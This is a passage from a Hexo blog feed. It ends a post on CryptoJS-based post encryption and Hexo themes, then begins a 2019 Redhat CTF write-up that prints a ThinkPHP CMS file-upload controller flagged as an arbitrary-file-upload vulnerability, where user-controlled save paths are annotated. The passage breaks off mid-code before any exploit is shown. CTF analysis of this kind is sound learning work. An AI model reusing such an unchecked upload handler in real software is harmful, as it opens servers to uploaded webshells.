punctuation">)</span><span class="token punctuation">;</span>                location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CryptoJS前端的加密算法，利用密钥生成密文作为密码写在md文档的password，每次浏览时输入密钥进行匹配，从而实现解密。</p><p>加密过程如下：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> CryptoJS <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto-js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CryptoJS<span class="token punctuation">.</span><span class="token function">SHA256</span><span class="token punctuation">(</span><span class="token string">'pperk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CryptoJS<span class="token punctuation">.</span>enc<span class="token punctuation">.</span>Hex<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-1-2-Markdown中Latex常用语法"><a href="#1-1-2-Markdown中Latex常用语法" class="headerlink" title="1.1.2  Markdown中Latex常用语法"></a>1.1.2  Markdown中Latex常用语法</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://peonycsa.com/mathjax-in-hexo/" target="_blank" rel="noopener">https://peonycsa.com/mathjax-in-hexo/</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><strong>1、</strong>hexo-blog-encrypt  <a href="https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md" target="_blank" rel="noopener">https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md</a></p><p><strong>2、</strong>使用CryptoJS 实现简单的加密解密 <a href="https://blog.csdn.net/weixin_40918145/article/details/81253772?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40918145/article/details/81253772?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2</a></p><p><strong>3、</strong>使用hexo+github搭建个人博客(进阶篇)  <a href="https://blog.csdn.net/qq_37210523/article/details/80909983" target="_blank" rel="noopener">https://blog.csdn.net/qq_37210523/article/details/80909983</a></p><h1 id="2-theme"><a href="#2-theme" class="headerlink" title="2.  theme"></a>2.  theme</h1><h2 id="2-1-sakura"><a href="#2-1-sakura" class="headerlink" title="2.1  sakura"></a>2.1  sakura</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>唯美主题hexo-sakura使用教程  <a href="https://www.jianshu.com/p/06f7814d815b" target="_blank" rel="noopener">https://www.jianshu.com/p/06f7814d815b</a></p><p><strong>2、</strong>教学视频  <a href="https://space.bilibili.com/271849279" target="_blank" rel="noopener">https://space.bilibili.com/271849279</a></p><h2 id="2-2-matery"><a href="#2-2-matery" class="headerlink" title="2.2  matery"></a>2.2  matery</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>【Hexo】Hexo 主题 Matery 配置</p><p><a href="https://cloud.tencent.com/developer/article/1626165" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1626165</a></p><p><strong>2、</strong>Hexo博客美化合集（不断更新） <a href="https://zhuanlan.zhihu.com/p/69211731" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/69211731</a></p><p><strong>3、</strong><a href="https://blinkfox.github.io/2018/09/28/qian-duan/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/#toc-heading-1" target="_blank" rel="noopener">https://blinkfox.github.io/2018/09/28/qian-duan/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/#toc-heading-1</a></p><p><strong>4、</strong>排版可以参照下这个<a href="https://blog.xiafeng2333.top/" target="_blank" rel="noopener">https://blog.xiafeng2333.top/</a></p><p>原排版太整齐，又太密，感觉原版的块状太单调了。</p><p><strong>5、</strong>Artitalk说说心情发布页面（个性定制）  <a href="https://cungudafa.blog.csdn.net/article/details/106224223" target="_blank" rel="noopener">https://cungudafa.blog.csdn.net/article/details/106224223</a></p><p><strong>6、</strong>hexo（matery）背景、滚动条优化+增加点击跳评论  <a href="https://blog.csdn.net/cungudafa/article/details/106278206" target="_blank" rel="noopener">https://blog.csdn.net/cungudafa/article/details/106278206</a></p><p><strong>7、</strong>hexo之高级美化篇  <a href="https://www.jianshu.com/p/71fefc42f5fd" target="_blank" rel="noopener">https://www.jianshu.com/p/71fefc42f5fd</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019--redhat</title>
      <link href="/2020/05/04/2019-redhat/"/>
      <url>/2020/05/04/2019-redhat/</url>
      
        <content type="html"><![CDATA[<h1 id="1-redhat初赛"><a href="#1-redhat初赛" class="headerlink" title="1. redhat初赛"></a>1. redhat初赛</h1><h1 id="2-redhat复赛"><a href="#2-redhat复赛" class="headerlink" title="2. redhat复赛"></a>2. redhat复赛</h1><h2 id="2-1-粤湾投资（cms）"><a href="#2-1-粤湾投资（cms）" class="headerlink" title="2.1 粤湾投资（cms）"></a>2.1 粤湾投资（cms）</h2><p><strong>爱客猴框架：</strong><a href="https://www.aikehou.com/" target="_blank" rel="noopener">https://www.aikehou.com/</a></p><h3 id="漏洞1-任意文件上传"><a href="#漏洞1-任意文件上传" class="headerlink" title="漏洞1 任意文件上传"></a>漏洞1 任意文件上传</h3><p><strong>漏洞路径：</strong>\www\Apps\Home\Controller\ UploadfileController.class.php </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** Author: [ Copy Lian ]* Date: [ 2015.05.08 ]* Description [ 上传文件控制器 ]*/</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">UploadfileController</span> <span class="token keyword">extends</span> <span class="token class-name">CommonController</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * [index 文件上传代码]     * @return [type] [description]     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">IS_POST</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/**             * 1、如果是图片直接调用uploadPhoto()             * 2、如果是替他附件则按照当前配置设置            */</span>            <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.type'</span><span class="token punctuation">,</span><span class="token string">'files'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//在thinkphp中为了安全的原因建议统一使用 I 函数来获取变量值，也就是说这些post的值我们都是可以控制的。</span>            <span class="token variable">$saveDir</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.savedir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$thumbw</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.thumbw'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$thumbh</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.thumbh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.filesize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string">'images'</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^image\//'</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'Filedata'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//这里如果匹配到image/结构，进入判断,^表开头。</span>                <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token string">"images"</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//是否添加水印</span>                <span class="token variable">$water</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.water'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$water</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$water_site</span> <span class="token operator">=</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SITE_SYSTEM_IMG_WATER'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 配置操作函数C（大写字母C）。ThinkPHP按照默认的顺序加载完配置之后，配置全局有效，在框架作用范围内（一般指应用目录下），所有配置都可以直接使用C函数读取（包括ThinkPHP默认配置）。</span>                    <span class="token variable">$water_new</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$water_site</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$water_site</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$water_site</span> <span class="token punctuation">:</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SYSTEM_IMG_WATER'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//$info = uploadPhoto('photo/'.$type.'',$thumbw,$thumbh,array('open'=>1));</span>                    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">uploadPhoto</span><span class="token punctuation">(</span><span class="token variable">$saveDir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$thumbw</span><span class="token punctuation">,</span><span class="token variable">$thumbh</span><span class="token punctuation">,</span><span class="token variable">$water_new</span><span class="token punctuation">,</span><span class="token variable">$filesize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">uploadPhoto</span><span class="token punctuation">(</span><span class="token variable">$saveDir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$thumbw</span><span class="token punctuation">,</span><span class="token variable">$thumbh</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$filesize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$error_data</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">;</span>                    <span class="token variable">$error_data</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ajaxReturn</span><span class="token punctuation">(</span><span class="token variable">$error_data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'oringinal_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'images'</span><span class="token punctuation">;</span>                <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'Filedata'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'savename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savepath'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'thumb'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'thumbpath'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'location'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload'</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ajaxReturn</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token string">'files'</span><span class="token punctuation">;</span>                <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">maxSize</span> <span class="token operator">=</span> <span class="token variable">$filesize</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件上传的最大文件大小，附件最大100M</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件上传保存的根路径</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span><span class="token punctuation">.</span><span class="token string">"Public/Uploads/"</span><span class="token punctuation">.</span><span class="token variable">$saveDir</span><span class="token punctuation">.</span><span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$type</span> <span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//文件上传的保存路径</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">saveName</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//上传文件的保存规则</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replace</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在同名文件是否是覆盖</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">autoSub</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//自动使用子目录保存上传文件</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">subName</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Ymd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//子目录创建方式，采用数组或者字符串方式定义</span>                <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hash</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//是否生成文件的hash编码 默认为true</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$error_data</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    <span class="token variable">$error_data</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ajaxReturn</span><span class="token punctuation">(</span><span class="token variable">$error_data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//处理文件图标</span>                    <span class="token comment" spellcheck="true">//excel</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'xls'</span><span class="token punctuation">,</span><span class="token string">'xlsx'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'xls'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//ppt</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'ppt'</span><span class="token punctuation">,</span><span class="token string">'pptx'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ppt'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//word</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'doc'</span><span class="token punctuation">,</span><span class="token string">'docx'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'doc'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//音频</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'wma'</span><span class="token punctuation">,</span><span class="token string">'mp3'</span><span class="token punctuation">,</span><span class="token string">'mid'</span><span class="token punctuation">,</span><span class="token string">'wav'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'mp3'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//视频</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'avi'</span><span class="token punctuation">,</span><span class="token string">'mov'</span><span class="token punctuation">,</span><span class="token string">'mpeg'</span><span class="token punctuation">,</span><span class="token string">'mpg'</span><span class="token punctuation">,</span><span class="token string">'swf'</span><span class="token punctuation">,</span><span class="token string">'mp4'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'vedio'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//zip</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'zip'</span><span class="token punctuation">,</span><span class="token string">'rar'</span><span class="token punctuation">,</span><span class="token string">'7z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'zip'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//判断是否存在文件不存在则取默认图片</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"./Public/images/uploadfile/"</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"readme"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'oringinal_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'files'</span><span class="token punctuation">;</span>                    <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savepathall'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savepath'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'location'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload'</span><span class="token punctuation">;</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ajaxReturn</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//缩略图配置</span>            <span class="token variable">$site_thumbw</span> <span class="token operator">=</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SITE_SYSTEM_THUMB_WIDTH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$site_thumbh</span> <span class="token operator">=</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SITE_SYSTEM_THUMB_HEIGHT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$thumbw</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$site_thumbw</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$site_thumbw</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SITE_SYSTEM_THUMB_WIDTH'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SYSTEM_THUMB_WIDTH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$thumbh</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$site_thumbh</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$site_thumbh</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SITE_SYSTEM_THUMB_HEIGHT'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'SYSTEM_THUMB_HEIGHT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbw</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.thumbw'</span><span class="token punctuation">,</span><span class="token variable">$thumbw</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbh</span> <span 